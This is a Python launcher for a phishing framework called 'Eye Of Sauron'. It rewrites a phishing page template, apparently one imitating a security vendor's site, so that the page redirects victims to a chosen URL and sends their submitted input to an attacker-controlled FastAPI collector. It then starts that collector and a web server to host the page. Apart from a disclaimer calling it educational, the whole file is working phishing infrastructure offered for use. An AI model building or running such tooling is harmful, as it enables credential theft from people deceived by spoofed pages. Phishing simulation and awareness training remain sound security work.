import argparse
import re
import os
import socket
import psutil

def get_all_ips():
    ips = []
    for interface, snics in psutil.net_if_addrs().items():
        for snic in snics:
            if snic.family == socket.AF_INET:  # Only IPv4
                ips.append(snic.address)
    #print(ips)
    return(ips)

def search_and_replace(link, webURL, apiURL, page):
    with open('pages/'+page, 'r') as file:
        file_contents = file.read()

    # The strings representing the redirect and the API endpoint
    replacement_url = f'window.location.replace("{link}");'
    api_replacement = f'const response = await fetch("{apiURL}",'

    # Replace the redirect link. Works finally
    updated_contents = re.sub(
        r'window\.location\.replace\([\'"].*?[\'"]\)?;?',
        replacement_url,
        file_contents
    )
    with open('active/index.html', 'w') as file:
        file.write(updated_contents)

    #Yeah two read writes in a row not the sexiest solution but will fix it later.

    with open('active/index.html', 'r') as file:
        file_contents = file.read()
    # Replace the fetch URL
    updated_contents2 = re.sub(
        r'const response = await fetch\([\'"].*?[\'"]\s*,',
        api_replacement,
        file_contents
    )

    with open('active/index.html', 'w') as file:
        file.write(updated_contents2)

    #For debugging
    #print(re.findall(r'const response = await fetch\([\'"].*?[\'"]\s*,', file_contents))
    #print(re.findall(r'window\.location\.replace\([\'"].*?[\'"]\);', file_contents))




def launch_Baradur(api_ip, api_port, launch_web_server, web_server_port):
    print("[!]Launching FastAPI and a basic http server in different consoles")
    os.system("x-terminal-emulator -e fastapi run Baradur.py --host "+api_ip+" --port "+api_port+"&") #Not the best apporach bas I like it quick n dirty
    if launch_web_server==True:
        os.system("x-terminal-emulator -e bash -c 'cd active && python3 -m http.server "+web_server_port+"'")


def program():
    parser=argparse.ArgumentParser(
        prog='Eye Of Sauron',
        description='Just a little phishing framework',
        epilog='The coordinates are mine Sam !'
    )
    parser.add_argument('-r', required=True, help='URL to redirect to when the user clicks the button: https://google.com')
    parser.add_argument('-i', required=True, help='IP or domain of the machine hosting the pages.')
    parser.add_argument('-p', required=True, help='Port of the machine hosting the web pages.')
    parser.add_argument('--api-ip', required=True, help='IP or domain of the machine hosting fastapi. If set to localhost or the IP of this machine it will spin up a web server.')
    parser.add_argument('--api-port', required=True, help='Port of the machine where fastapi is running.')
    parser.add_argument('--page',required=True, help='The name of the phishing page you would like to use. They have to follow a certain template. Examine at CrowedStrike.html for reference.')
    args=parser.parse_args()
    machineIPs=get_all_ips()
    launch_web_server=False
    for x in machineIPs:
        if args.i=='localhost' or args.i==x:
            launch_web_server=True
            print('[+]WebServer IP belongs to this machine. Will launch a webserver!')
            break
    if launch_web_server==False:
        print('[-]Supplied ')
    webURL='http://'+str(args.i)+':'+str(args.p)
    apiURL='http://'+str(args.api_ip)+':'+str(args.api_port)
    search_and_replace(args.r, webURL, apiURL, args.page)
    launch_Baradur(args.api_ip, args.api_port, launch_web_server, args.p)

    return


def __main__():
    print('[+]Eye Of Sauron')
    print('[!]Are ya phishing son?!')
    print('[!]DISCLAIMER: THE DEVELOPER OF THIS SCRIPT WILL NOT BE HELD LIABLE FOR POTENTIAL DAMAGES DONE WITH IT. YOU HAVE BEEN WARNED THIS IS A TOOL FOR EDUCATIONAL PURPOSES ONLY.')
    program()

#search_and_replace('https://test.com','lol','https://api.crowedstrike')

__main__()